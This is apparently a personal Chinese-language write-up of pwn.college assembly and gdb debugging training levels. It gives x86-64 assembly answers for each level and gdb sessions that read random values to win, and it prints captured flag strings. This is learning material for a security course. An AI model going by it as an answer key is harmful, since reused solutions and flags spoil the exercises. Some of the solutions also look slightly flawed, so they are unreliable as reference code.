<h4 id="memory-read"><a href="#memory-read" class="headerlink" title="memory-read"></a>memory-read</h4><p>请执行以下操作：将存储在 <code>0x404000</code> 的值放入 <code>rax</code> 中。确保 <code>rax</code> 中的值是存储在 <code>0x404000</code> 的原始值。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, [0x404000]</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="memory-write"><a href="#memory-write" class="headerlink" title="memory-write"></a>memory-write</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov [0x404000], rax</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="memory-increment"><a href="#memory-increment" class="headerlink" title="memory-increment"></a>memory-increment</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, [0x404000]</span><br><span class="line">    mov rbx , rax</span><br><span class="line">    add rbx , 0x1337</span><br><span class="line">    mov [0x404000], rbx</span><br></pre></td></tr></table></figure>



<h4 id="byte-access"><a href="#byte-access" class="headerlink" title="byte-access"></a>byte-access</h4><p>Here is the breakdown of the names of memory sizes:<br>以下是内存大小名称的细分：</p>
<ul>
<li>Quad Word &#x3D; 8 Bytes &#x3D; 64 bits<br>四字 &#x3D; 8 字节 &#x3D; 64 位</li>
<li>Double Word &#x3D; 4 bytes &#x3D; 32 bits<br>双字 &#x3D; 4 字节 &#x3D; 32 位</li>
<li>Word &#x3D; 2 bytes &#x3D; 16 bits<br>字 &#x3D; 2 字节 &#x3D; 16 位</li>
<li>Byte &#x3D; 1 byte &#x3D; 8 bits<br>字节 &#x3D; 1 字节 &#x3D; 8 位</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov al, [0x404000]</span><br></pre></td></tr></table></figure>

<p>在 x86_64 中，您可以在取消引用地址时访问这些大小，就像使用更大或更小的 register 访问一样：</p>
<ul>
<li><code>mov al, [address]</code> &lt;&#x3D;&gt; moves the least significant byte from address to <code>rax</code><br><code>mov al， [address]</code> &lt;&#x3D;&gt; 将最低有效字节从 address 移动到 <code>rax</code></li>
<li><code>mov ax, [address]</code> &lt;&#x3D;&gt; moves the least significant word from address to <code>rax</code><br><code>mov ax， [address]</code> &lt;&#x3D;&gt; 将最低有效字从 address 移动到 <code>rax</code></li>
<li><code>mov eax, [address]</code> &lt;&#x3D;&gt; moves the least significant double word from address to <code>rax</code><br><code>mov eax， [address]</code> &lt;&#x3D;&gt; 将最低有效双字从 address 移动到 <code>rax</code></li>
<li><code>mov rax, [address]</code> &lt;&#x3D;&gt; moves the full quad word from address to <code>rax</code><br><code>mov rax， [address]</code> &lt;&#x3D;&gt; 将完整的四元字从 address 移动到 <code>rax</code></li>
</ul>
<h4 id="memory-size-access"><a href="#memory-size-access" class="headerlink" title="memory-size-access"></a>memory-size-access</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov al, [0x404000]</span><br><span class="line">    mov bx, [0x404000]</span><br><span class="line">    mov ecx, [0x404000]</span><br><span class="line">    mov rdx, [0x404000]</span><br></pre></td></tr></table></figure>



<h4 id="little-endian-write"><a href="#little-endian-write" class="headerlink" title="little-endian-write"></a>little-endian-write</h4><p>值得注意的是，值的存储顺序与我们表示它们的顺序相反。example:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">;[0x1330] = 0x00000000deadc0de</span><br><span class="line">; 检查它在内存中的实际存储情况：</span><br><span class="line">;[0x1330] = 0xde</span><br><span class="line">;[0x1331] = 0xc0</span><br><span class="line">;[0x1332] = 0xad</span><br><span class="line">;[0x1333] = 0xde</span><br><span class="line">;[0x1334] = 0x00</span><br><span class="line">;[0x1335] = 0x00</span><br><span class="line">;[0x1336] = 0x00</span><br><span class="line">;[0x1337] = 0x00</span><br></pre></td></tr></table></figure>

<p>这就是小端存储（Little Endian）。</p>
<p>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, 0xdeadbeef00001337</span><br><span class="line">    mov [rdi], rax</span><br><span class="line">    mov rax, 0xc0ffee0000</span><br><span class="line">    mov [rsi], rax</span><br></pre></td></tr></table></figure>



<h4 id="memory-sum"><a href="#memory-sum" class="headerlink" title="memory-sum"></a>memory-sum</h4><p>内存是连续存储的，因此可以使用偏移量来获取指定字节。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">;[0x1337] = 0x00000000deadbeef</span><br><span class="line">;[0x1337] = 0xef</span><br><span class="line">;[0x1337 + 1] = 0xbe</span><br><span class="line">;[0x1337 + 2] = 0xad</span><br><span class="line">...</span><br><span class="line">;[0x1337 + 7] = 0x00</span><br><span class="line">; 假设我需要访问某个地址的第5个字节。那么可以：</span><br><span class="line">mov al, [address+4]</span><br></pre></td></tr></table></figure>

<p>题目要求：</p>
<ul>
<li>Load two consecutive quad words from the address stored in <code>rdi</code>.<br>从存储在 <code>rdi</code> 中的地址加载两个连续的四字。</li>
<li>Calculate the sum of the previous steps’ quad words.<br>计算前面步骤的四边形词的总和。</li>
<li>Store the sum at the address in <code>rsi</code>.<br>将总和存储在 <code>rsi</code> 中的地址。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, [rdi]</span><br><span class="line">    mov rbx, [rdi+8]</span><br><span class="line">    add rax, rbx</span><br><span class="line">    mov [rsi], rax</span><br></pre></td></tr></table></figure>



<h4 id="stack-substraction"><a href="#stack-substraction" class="headerlink" title="stack-substraction"></a>stack-substraction</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    pop rax</span><br><span class="line">    sub rax, rdi</span><br><span class="line">    push rax</span><br></pre></td></tr></table></figure>



<h4 id="swap-stack-values"><a href="#swap-stack-values" class="headerlink" title="swap-stack-values"></a>swap-stack-values</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push rdi</span><br><span class="line">    push rsi</span><br><span class="line">    pop rdi</span><br><span class="line">    pop rsi</span><br></pre></td></tr></table></figure>



<h4 id="average-stack-values"><a href="#average-stack-values" class="headerlink" title="average-stack-values"></a>average-stack-values</h4><p>除法还是很坑的，记得一定是<code>rdx:rax / reg</code>，商在rax中，余数在rdx中。因此，在调用div的时候一定要清空rdx寄存器（如果被除数没有占用到rdx的话）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rdx, [rsp]</span><br><span class="line">    mov rcx, [rsp+0x8]</span><br><span class="line">    mov rbx, [rsp+0x10]</span><br><span class="line">    mov rax, [rsp+0x18]</span><br><span class="line">    add rax, rbx</span><br><span class="line">    add rax, rcx</span><br><span class="line">    add rax, rdx</span><br><span class="line">    mov rbx, 4</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    div rbx</span><br><span class="line">    push rax</span><br></pre></td></tr></table></figure>



<h4 id="absolute-jump"><a href="#absolute-jump" class="headerlink" title="absolute-jump"></a>absolute-jump</h4><p>绝对跳转，指的是跳转到指定地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax,0x403000</span><br><span class="line">    jmp rax</span><br></pre></td></tr></table></figure>



<h4 id="relative-jump"><a href="#relative-jump" class="headerlink" title="relative-jump"></a>relative-jump</h4><p>对于所有跳转，有三种类型：</p>
<ul>
<li>Relative jumps: jump + or - the next instruction.<br>相对跳转：jump + 或 - 下一条指令。</li>
<li>Absolute jumps: jump to a specific address.<br>Absolute jumps：跳转到指定地址。</li>
<li>Indirect jumps: jump to the memory address specified in a register.<br>Indirect jumps：跳转到 register 中指定的 memory 地址。</li>
</ul>
<p><code>jmp (reg1 | addr | +/-offset)</code></p>
<p>要求：</p>
<ul>
<li>Make the first instruction in your code a <code>jmp</code>.<br>将代码中的第一条指令设为 <code>jmp</code>。</li>
<li>Make that <code>jmp</code> a relative jump to 0x51 bytes from the current position.<br>使该 <code>jmp</code> 相对跳转到 0x51 字节的当前位置。</li>
<li>At the code location where the relative jump will redirect control flow, set <code>rax</code> to 0x1.<br>在相对跳转将重定向控制流的代码位置，将 <code>rax</code> 设置为 0x1。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    jmp set_rax</span><br><span class="line">    .rept 0x51</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">set_rax:   </span><br><span class="line">    mov rax,0x1</span><br></pre></td></tr></table></figure>



<h4 id="jump-trampoline"><a href="#jump-trampoline" class="headerlink" title="jump-trampoline"></a>jump-trampoline</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    jmp set_rax</span><br><span class="line">    .rept 0x51</span><br><span class="line">    nop</span><br><span class="line">    .endr</span><br><span class="line">set_rax:  </span><br><span class="line">    pop rdi</span><br><span class="line">    mov rbx, 0x403000</span><br><span class="line">    jmp rbx</span><br></pre></td></tr></table></figure>



<h4 id="conditional-jump"><a href="#conditional-jump" class="headerlink" title="conditional-jump"></a>conditional-jump</h4><p>挖草，巨坑的一点！</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov eax, [rdi]</span><br><span class="line">    cmp eax, 0x7f454c46</span><br><span class="line">    je flag_1</span><br><span class="line">    cmp eax, 0x00005A4D</span><br><span class="line">    je flag_2</span><br><span class="line">    jmp flag_3</span><br><span class="line"></span><br><span class="line">flag_1:</span><br><span class="line">    mov eax, [rdi+4]</span><br><span class="line">    add eax, [rdi+8]</span><br><span class="line">    add eax, [rdi+12]</span><br><span class="line">    jmp done</span><br><span class="line">flag_2:</span><br><span class="line">    mov eax, [rdi+4]</span><br><span class="line">    sub eax, [rdi+8]</span><br><span class="line">    sub eax, [rdi+12]</span><br><span class="line">    jmp done</span><br><span class="line">flag_3:</span><br><span class="line">    mov eax, [rdi+4]</span><br><span class="line">    imul eax,[rdi+8]</span><br><span class="line">    imul eax, [rdi+12]</span><br><span class="line">    jmp done</span><br><span class="line">done:</span><br></pre></td></tr></table></figure>

<p>注意的是<code>mov eax, [rdi]</code>，如果用<code>mov rax, [rdi]</code>会出问题，因为会读取<code>rdi</code>地址上的pword，那么永远走的都是else下的语句。服了。</p>
<h4 id="indirect-jump"><a href="#indirect-jump" class="headerlink" title="indirect-jump"></a>indirect-jump</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, rdi</span><br><span class="line">    cmp rax, 3</span><br><span class="line">    jg default</span><br><span class="line">    imul rax,8</span><br><span class="line">    add rax, rsi</span><br><span class="line">    jmp [rax]</span><br><span class="line">default:</span><br><span class="line">    mov rax, rsi</span><br><span class="line">    add rax, 0x20</span><br><span class="line">    jmp [rax]</span><br></pre></td></tr></table></figure>

<p>这里其实也有坑，需要好好把控<code>[]</code>会解析地址。例如下面的exp：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, rdi</span><br><span class="line">    cmp rax, 3</span><br><span class="line">    jg default</span><br><span class="line">    mov rax, [rsi + rdi * 8]</span><br><span class="line">    jmp rax</span><br><span class="line">default:</span><br><span class="line">    mov rax, [rsi + 0x20]</span><br><span class="line">    jmp rax</span><br></pre></td></tr></table></figure>



<h4 id="average-loop"><a href="#average-loop" class="headerlink" title="average-loop"></a>average-loop</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rcx, 0</span><br><span class="line">    mov rax, 0</span><br><span class="line">    mov rbx, rdi</span><br><span class="line">loop_start:</span><br><span class="line">    add rax, [rbx]</span><br><span class="line">    inc rcx</span><br><span class="line">    add rbx, 0x8</span><br><span class="line">    cmp rcx, rsi</span><br><span class="line">    jg loop_end</span><br><span class="line">    jmp loop_start</span><br><span class="line">loop_end:</span><br><span class="line">    mov rbx, rsi</span><br><span class="line">    div rbx</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<blockquote>
<p>依然是要注意<code>[]</code>的使用，要认知是取内存指向的值，还是取内存进行加减。</p>
</blockquote>
<h4 id="count-non-zero"><a href="#count-non-zero" class="headerlink" title="count-non-zero"></a>count-non-zero</h4><p>感觉主要问题是，我没理解题目的意思。理解后就很简单了。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rax, 0</span><br><span class="line">loop_start:</span><br><span class="line">    cmp rdi, 0</span><br><span class="line">    je loop_end</span><br><span class="line">    mov bl, [rdi]</span><br><span class="line">    cmp bl, 0</span><br><span class="line">    je loop_end</span><br><span class="line">    inc rdi</span><br><span class="line">    inc rax</span><br><span class="line">    jmp loop_start</span><br><span class="line"></span><br><span class="line">loop_end:</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="string-lower"><a href="#string-lower" class="headerlink" title="string lower"></a>string lower</h4><p>这个还行，一遍过了。还记得系统调用的时候，第一个参数是用<code>rdi</code>存储，第二个参数是用<code>rsi</code>存储</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    mov rbx, 0</span><br><span class="line">    cmp rdi, 0</span><br><span class="line">    jne loop_start</span><br><span class="line">    jmp done</span><br><span class="line">loop_start:</span><br><span class="line">    mov cl, [rdi]</span><br><span class="line">    cmp cl, 0x00</span><br><span class="line">    je done</span><br><span class="line">    cmp cl, 0x5a</span><br><span class="line">    jle exe_1</span><br><span class="line">    inc rdi</span><br><span class="line">    jmp loop_start</span><br><span class="line">exe_1:</span><br><span class="line">    mov rcx, rdi</span><br><span class="line">    mov rax, 0x403000</span><br><span class="line">    mov rdi, [rdi]</span><br><span class="line">    call rax</span><br><span class="line">    mov rdi, rcx</span><br><span class="line">    mov [rdi], rax</span><br><span class="line">    inc rbx</span><br><span class="line">    inc rdi</span><br><span class="line">    jmp loop_start</span><br><span class="line">done:</span><br><span class="line">    mov rax, rbx</span><br><span class="line">    ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="most-common-byte"><a href="#most-common-byte" class="headerlink" title="most-common-byte"></a>most-common-byte</h4><p>这道题卡了半天吧得，主要是对寄存器不熟悉，重复用了一些寄存器，然后导致出现问题，后面用普通寄存器<code>r8~15</code>解决的，普通寄存器也得用，不然变量不够存的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">    push rbp</span><br><span class="line">    mov rbp, rsp</span><br><span class="line">    sub rsp, 0x200</span><br><span class="line">    mov rcx, 0</span><br><span class="line"></span><br><span class="line">loop_count_bytes:</span><br><span class="line">    cmp rcx, rsi</span><br><span class="line">    jge loop_count_bytes_end</span><br><span class="line"></span><br><span class="line">    mov dl, [rdi + rcx]</span><br><span class="line">    movzx rax, dl</span><br><span class="line">    mov rbx, rbp</span><br><span class="line">    sub rbx, rax</span><br><span class="line">    inc byte ptr [rbx]</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp loop_count_bytes</span><br><span class="line"></span><br><span class="line">loop_count_bytes_end:</span><br><span class="line">    mov rcx, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 0</span><br><span class="line"></span><br><span class="line">loop_find_max:</span><br><span class="line">    cmp rcx, 0xff</span><br><span class="line">    jg loop_find_max_end</span><br><span class="line">    mov rbx, rbp</span><br><span class="line">    sub rbx, rcx</span><br><span class="line">    mov r8b, [rbx]</span><br><span class="line">    movzx rbx, r8b</span><br><span class="line">    cmp rbx, rdx</span><br><span class="line">    jle skip_update</span><br><span class="line">    mov rdx, rbx</span><br><span class="line">    mov rax, rcx</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp loop_find_max</span><br><span class="line"></span><br><span class="line">skip_update:</span><br><span class="line">    inc rcx</span><br><span class="line">    jmp loop_find_max</span><br><span class="line"></span><br><span class="line">loop_find_max_end:</span><br><span class="line">    mov rsp, rbp</span><br><span class="line">    pop rbp</span><br><span class="line">    ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Debugging-Refresher"><a href="#Debugging-Refresher" class="headerlink" title="Debugging Refresher"></a>Debugging Refresher</h3><h4 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h4><p>直接run一下，再continue一下就好了，gdb的简单使用</p>
<h4 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p/x $r12</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">2 = 0x18215a7f83c98b8e</span></span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random value: 0x18215a7f83c98b8e</span><br><span class="line">You input: 18215a7f83c98b8e</span><br><span class="line">The correct answer is: 18215a7f83c98b8e</span><br><span class="line">You win! Here is your flag:</span><br><span class="line">pwn.college&#123;ETe5riLiwE1X6xz1M0yCPK4-4WH.0VN0IDLxYTN1YzW&#125;</span><br></pre></td></tr></table></figure>



<h4 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h4><p>通过在read处打断点，然后执行到read函数时，查看寄存器信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(gdb) info registers </span><br><span class="line">rax            0x7fff17b9e998      140733591447960</span><br><span class="line">rbx            0x5f31bbc71d10      104667208424720</span><br><span class="line">rcx            0x3                 3</span><br><span class="line">rdx            0x8                 8</span><br><span class="line">rsi            0x7fff17b9e998      140733591447960</span><br><span class="line">rdi            0x3                 3</span><br><span class="line">rbp            0x7fff17b9e9b0      0x7fff17b9e9b0</span><br><span class="line">rsp            0x7fff17b9e968      0x7fff17b9e968</span><br><span class="line">r8             0x3d                61</span><br><span class="line">r9             0x2c                44</span><br><span class="line">r10            0x0                 0</span><br><span class="line">r11            0x246               582</span><br><span class="line">r12            0x5f31bbc712a0      104667208422048</span><br><span class="line">r13            0x7fff17b9eaa0      140733591448224</span><br><span class="line">r14            0x0                 0</span><br><span class="line">r15            0x0                 0</span><br><span class="line">rip            0x5f31bbc71210      0x5f31bbc71210 &lt;read@plt&gt;</span><br><span class="line">eflags         0x202               [ IF ]</span><br></pre></td></tr></table></figure>

<p><code>rsi</code>作为read系统调用的buf参数，所以在随机数被set后，读取这个地址的值即可。（我发现不能断点给到read函数，因为从main中执行到read的时候，有其他函数会调用read，然后就会导致它read一直失败报错）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">The random value has been set!</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Program received signal SIGTRAP, Trace/breakpoint trap.</span><br><span class="line">0x00005f31bbc71c64 in main ()</span><br><span class="line">(gdb) x /8x 0x7fff17b9e998</span><br><span class="line">0x7fff17b9e998: 0xd81c082e      0xc0e7d841      0x17b9eaa0      0x00007fff</span><br><span class="line">0x7fff17b9e9a8: 0x34e94700      0xa2fdab81      0x00000000      0x00000000</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">Random value: c0e7d841d81c082e</span><br><span class="line">You input: c0e7d841d81c082e</span><br><span class="line">The correct answer is: c0e7d841d81c082e</span><br><span class="line">You win! Here is your flag:</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x00005f31bbc71210 in read@plt ()</span><br><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">pwn.college&#123;s102MI2GzaSB-30x2SjuMIlWzDy.0lN0IDLxYTN1YzW&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[Inferior 1 (process 4714) exited normally]</span><br></pre></td></tr></table></figure>

<p>没毛病！至于为什么这个随机值是反着的，存储的是小端序，手动改成大端序才行。而且输出是以4字节为单位的，所以只需要将八字节反向一下即可。类似地，以一个字节为单位输出，也可以手动转换</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x /8x 0x7ffccd2aa938</span><br><span class="line">0x7ffccd2aa938: 0x30    0xe5    0x4d    0x5b    0xce    0xe0    0x9a    0x51</span><br><span class="line">(gdb) 519ae0ce5b4de530</span><br></pre></td></tr></table></figure>

